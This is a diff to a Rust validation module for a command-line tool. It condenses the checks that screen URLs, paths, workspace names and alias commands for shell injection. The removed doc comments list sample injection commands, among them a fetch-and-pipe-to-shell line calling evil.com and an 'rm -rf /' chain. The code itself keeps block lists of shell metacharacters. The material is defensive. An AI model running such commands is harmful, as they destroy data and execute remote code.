@@ -12,26 +12,6 @@ const MAX_URL_LENGTH: usize = 2048;
 /// Maximum output filename length
 const MAX_OUTPUT_LENGTH: usize = 255;
 
-/// Validates a URL for vget command
-///
-/// Uses the `url` crate for robust URL parsing instead of manual validation.
-/// This validates:
-/// - URL format (syntax, encoding, etc.)
-/// - Protocol must be http or https
-/// - Must have a valid hostname
-/// - Length limit to prevent DoS
-/// - No command injection characters
-///
-/// # Defense in Depth
-/// While Command::arg() provides protection against shell interpretation,
-/// we also validate the URL itself to block malicious characters.
-/// This prevents attacks even if the URL is used in other contexts.
-///
-/// # Safety
-/// This function uses multiple layers of protection:
-/// 1. URL parsing to validate format
-/// 2. Character validation to block injection attempts
-/// 3. Command::arg() at execution time
 pub fn validate_url(url_str: &str) -> Result<()> {
     let trimmed = url_str.trim();
 
@@ -56,51 +36,30 @@ pub fn validate_url(url_str: &str) -> Result<()> {
         "URL contains null byte - security risk"
     );
 
-    // Check for command injection characters
-    // These characters are dangerous if the URL is used in shell contexts
-    const DANGEROUS_CHARS: &[(&str, &str)] = &[
-        (";", "command separator - prevents command injection"),
-        ("|", "pipe operator - prevents command injection"),
-        ("`", "command substitution - prevents command injection"),
-        ("\n", "newline - prevents multi-line injection"),
-        ("\r", "carriage return - prevents injection"),
-    ];
+    const DANGEROUS_CHARS: &[&str] = &[";", "|", "`", "\n", "\r"];
 
-    for (ch, reason) in DANGEROUS_CHARS {
+    for ch in DANGEROUS_CHARS {
         ensure!(
             !url_str.contains(ch),
-            "URL contains dangerous character '{}' - {}",
-            ch,
-            reason
+            "URL contains dangerous character '{}'",
+            ch
         );
     }
 
-    // Check for command substitution patterns
     ensure!(
         !url_str.contains("$("),
-        "URL contains command substitution pattern $() - prevents code execution"
+        "URL contains command substitution pattern $()"
     );
 
-    // Check for shell operators with spaces (distinguishes from valid query params)
-    // "https://example.com & whoami" is malicious
-    // "https://example.com?a=1&b=2" is valid
     ensure!(
         !url_str.contains("& ") && !url_str.contains(" &"),
-        "URL contains shell operator with space - prevents command injection"
+        "URL contains shell operator with space"
     );
-    ensure!(
-        !url_str.contains("&& "),
-        "URL contains shell AND operator - prevents command injection"
-    );
-    ensure!(
-        !url_str.contains("|| "),
-        "URL contains shell OR operator - prevents command injection"
-    );
+    ensure!(!url_str.contains("&& "), "URL contains shell AND operator");
+    ensure!(!url_str.contains("|| "), "URL contains shell OR operator");
 
-    // Parse URL using the url crate - validates format, encoding, etc.
     let url = Url::parse(url_str).context("Invalid URL format")?;
 
-    // Validate protocol - only http/https for security
     let scheme = url.scheme();
     ensure!(
         scheme == "http" || scheme == "https",
@@ -108,19 +67,16 @@ pub fn validate_url(url_str: &str) -> Result<()> {
         scheme
     );
 
-    // Validate hostname exists
     ensure!(url.host_str().is_some(), "URL has no hostname");
 
     Ok(())
 }
 
-/// Validates an output path for vget command
-/// Checks for:
-/// - Path traversal (..)
-/// - Absolute paths
-/// - Drive letters (Windows)
-/// - Null bytes
-/// - Command injection characters
+pub fn validate_web_url(url: &str) -> Result<()> {
+    validate_url(url).context("Invalid web URL")?;
+    Ok(())
+}
+
 pub fn validate_output_path(output: &str) -> Result<()> {
     let trimmed = output.trim();
     ensure!(!trimmed.is_empty(), "Output path cannot be empty");
@@ -134,7 +90,6 @@ pub fn validate_output_path(output: &str) -> Result<()> {
         output
     );
 
-    // Check for drive letters on Windows (C:, D:, etc.)
     if output.len() >= 2 {
         ensure!(
             output.chars().nth(1) != Some(':'),
@@ -143,17 +98,13 @@ pub fn validate_output_path(output: &str) -> Result<()> {
         );
     }
 
-    ensure!(
-        !output.contains('\0'),
-        "Output path contains null byte - security risk"
-    );
+    ensure!(!output.contains('\0'), "Output path contains null byte");
 
-    // Check for dangerous characters
     const DANGEROUS_CHARS: [char; 7] = ['|', '&', ';', '$', '`', '\n', '\r'];
     for ch in DANGEROUS_CHARS {
         ensure!(
             !output.contains(ch),
-            "Output path contains dangerous character '{}' - potential command injection",
+            "Output path contains dangerous character '{}'",
             ch
         );
     }
@@ -168,12 +119,6 @@ pub fn validate_output_path(output: &str) -> Result<()> {
     Ok(())
 }
 
-/// Validates a directory path for set work/video commands
-/// Checks for:
-/// - Empty paths
-/// - Whitespace-only paths
-/// - Path pointing to a file instead of directory
-/// - Path with dangerous characters
 pub fn validate_directory_path(path: &str) -> Result<()> {
     let trimmed = path.trim();
     ensure!(
@@ -183,7 +128,6 @@ pub fn validate_directory_path(path: &str) -> Result<()> {
 
     let path_buf = Path::new(path);
 
-    // If path exists, verify it's a directory and not a file
     if path_buf.exists() {
         ensure!(
             !path_buf.is_file(),
@@ -192,7 +136,6 @@ pub fn validate_directory_path(path: &str) -> Result<()> {
         );
         ensure!(path_buf.is_dir(), "Path is not a valid directory: {}", path);
 
-        // Check for common file extensions (extra safety)
         if let Some(extension) = path_buf.extension() {
             const FILE_EXTENSIONS: [&str; 22] = [
                 "exe", "bin", "dll", "so", "dylib", "png", "jpg", "jpeg", "gif", "bmp", "svg",
@@ -209,28 +152,20 @@ pub fn validate_directory_path(path: &str) -> Result<()> {
         }
     }
 
-    ensure!(
-        !path.contains('\0'),
-        "Path contains null byte - security risk"
-    );
+    ensure!(!path.contains('\0'), "Path contains null byte");
 
     Ok(())
 }
 
-/// Sanitizes a workspace name
-/// Removes or replaces dangerous characters
 pub fn validate_workspace_name(name: &str) -> Result<()> {
-    // Check for empty
     if name.trim().is_empty() {
         return Err(anyhow!("Workspace name cannot be empty"));
     }
 
-    // Check for null bytes
     if name.contains('\0') {
         return Err(anyhow!("Workspace name contains null byte"));
     }
 
-    // Check for path separators (workspace names should not contain paths)
     if name.contains('/') || name.contains('\\') {
         return Err(anyhow!(
             "Workspace name cannot contain path separators: {}",
@@ -238,7 +173,6 @@ pub fn validate_workspace_name(name: &str) -> Result<()> {
         ));
     }
 
-    // Check for command injection characters
     let dangerous_chars = [';', '|', '&', '$', '`', '\n', '\r'];
     for ch in dangerous_chars {
         if name.contains(ch) {
@@ -250,7 +184,6 @@ pub fn validate_workspace_name(name: &str) -> Result<()> {
         }
     }
 
-    // Check length (reasonable limit)
     if name.len() > 100 {
         return Err(anyhow!("Workspace name is too long (max 100 characters)"));
     }
@@ -258,37 +191,7 @@ pub fn validate_workspace_name(name: &str) -> Result<()> {
     Ok(())
 }
 
-/// Validates an alias command to prevent command injection attacks
-///
-/// This is CRITICAL for security. Alias commands are written to executable scripts
-/// (bash scripts on Unix, shim executables on Windows) and executed by the shell.
-///
-/// CRITICAL VULNERABILITIES if not validated:
-/// - Command injection through semicolons (;)
-/// - Command chaining through && or ||
-/// - Command substitution through $() or backticks
-/// - Backgrounding malicious processes (&)
-/// - Pipe to arbitrary commands (|)
-/// - Output redirection to sensitive files (>, >>)
-///
-/// # Security Model
-/// We use a STRICT whitelist approach:
-/// - Only alphanumeric characters, spaces, hyphens, underscores, forward slashes, and dots
-/// - NO shell metacharacters allowed
-/// - This prevents ALL injection attacks while allowing normal commands
-///
-/// # Examples
-/// Valid commands:
-/// - "ls -la"
-/// - "python3 script.py"
-/// - "git status"
-/// - "cargo build --release"
-///
-/// Invalid commands (injection attempts):
-/// - "ls; rm -rf /" (semicolon separator)
-/// - "echo `whoami`" (command substitution)
-/// - "curl evil.com | bash" (pipe to shell)
-/// - "cat file > /etc/passwd" (redirection)
+/// See docs/security.md for security considerations
 pub fn validate_alias_command(command: &str) -> Result<()> {
     let _safe_regex = match Regex::new(r"^[a-zA-Z0-9\s\-_./]+$") {
         Ok(r) => r,
@@ -297,92 +200,54 @@ pub fn validate_alias_command(command: &str) -> Result<()> {
 
     let trimmed = command.trim();
 
-    // Basic checks
     ensure!(!trimmed.is_empty(), "Alias command cannot be empty");
-    ensure!(
-        !command.contains('\0'),
-        "Alias command contains null byte - security risk"
-    );
+    ensure!(!command.contains('\0'), "Alias command contains null byte");
 
-    // 1. CRITICAL: Implementar el Whitelisting Estricto
-    // Si la cadena contiene CUALQUIER COSA fuera de la lista segura, es rechazado.
     ensure!(
         !command.contains(';'),
-        "Alias command contains semicolon (;) - CRITICAL COMMAND SEPARATOR"
+        "Alias command contains semicolon (;)"
     );
     ensure!(
         !command.contains('|'),
-        "Alias command contains pipe operator (|) - CRITICAL COMMAND CHAINING"
+        "Alias command contains pipe operator (|)"
     );
     ensure!(
         !command.contains('&'),
-        "Alias command contains ampersand (&) - CRITICAL BACKGROUND/CHAINING"
+        "Alias command contains ampersand (&)"
     );
 
-    // CRITICAL: Check for command injection characters
-    // Using a whitelist approach - only allow safe characters
-    const DANGEROUS_KEYWORDS: &[(&str, &str)] = &[
-        // Comando Chaining / Separadores
-        (";", "command separator"),
-        ("|", "pipe operator"),
-        ("&&", "AND chaining operator"),
-        ("||", "OR chaining operator"),
-        ("&", "background/chaining operator"),
-        // Sustitución / Variables / Redirección
-        ("`", "backtick command substitution"),
-        ("$(", "dollar-paren command substitution"),
-        ("$", "variable/command substitution"),
-        (">", "output redirection"),
-        ("<", "input redirection"),
-        // Wildcards / Expansión
-        ("*", "wildcard/globbing"),
-        ("?", "wildcard/globbing"),
-        ("[", "wildcard/globbing"),
-        ("]", "wildcard/globbing"),
-        ("~", "home directory expansion"),
-        // Estructuras / Evasión
-        ("\n", "newline"),
-        ("\r", "carriage return"),
-        ("(", "subshell / grouping"),
-        (")", "subshell / grouping"),
-        ("{", "brace expansion / grouping"),
-        ("}", "brace expansion / grouping"),
-        ("!", "history expansion"),
+    const DANGEROUS_KEYWORDS: &[&str] = &[
+        ";", "|", "&&", "||", "&", "`", "$(", "$", ">", "<", "*", "?", "[", "]", "~", "\n", "\r",
+        "(", ")", "{", "}", "!",
     ];
 
-    for (ch, reason) in DANGEROUS_KEYWORDS {
+    for ch in DANGEROUS_KEYWORDS {
         ensure!(
             !command.contains(ch),
-            "Alias command contains dangerous character '{}' - {}",
-            ch,
-            reason
+            "Alias command contains dangerous character '{}'",
+            ch
         );
     }
 
-    // 2. Fallo de seguridad potencial: Caracteres en blanco (Whitespace) que no son espacios
-    // Bash puede usar tabs (`\t`) y otros caracteres invisibles como separadores.
     ensure!(
         !command.contains('\t'),
-        "Alias command contains tab character - potential injection evasion"
+        "Alias command contains tab character"
     );
 
-    // 3. Fallo de seguridad: Uso de comillas (Quotes)
     ensure!(
         !command.contains('"') && !command.contains('\''),
-        "Alias command contains quotes (' or \") - highly prone to injection and expansion issues"
+        "Alias command contains quotes"
     );
 
-    // Additional pattern checks for obfuscated attacks (Mantener)
     ensure!(
         !command.contains("exec"),
-        "Alias command contains 'exec' keyword - potential code execution"
+        "Alias command contains 'exec' keyword"
     );
     ensure!(
         !command.contains("eval"),
-        "Alias command contains 'eval' keyword - potential code execution"
+        "Alias command contains 'eval' keyword"
     );
 
-    // Length check
     ensure!(
         command.len() <= 500,
         "Alias command is too long ({} characters, max 500)",
@@ -392,15 +257,7 @@ pub fn validate_alias_command(command: &str) -> Result<()> {
     Ok(())
 }
 
-/// Validates an alias command specifically for Windows environments
-///
-/// Windows has different shell metacharacters and injection vectors:
-/// - PowerShell injection through quotes and special chars
-/// - CMD.exe injection through batch operators
-/// - File path manipulation with UNC paths
-///
-/// NOTE: Unlike Unix, backslashes are allowed in Windows commands
-/// since they are the standard path separator (e.g., C:\Users\Documents)
+/// See docs/security.md for security considerations
 pub fn validate_alias_command_windows(command: &str) -> Result<()> {
     let trimmed = command.trim();
 
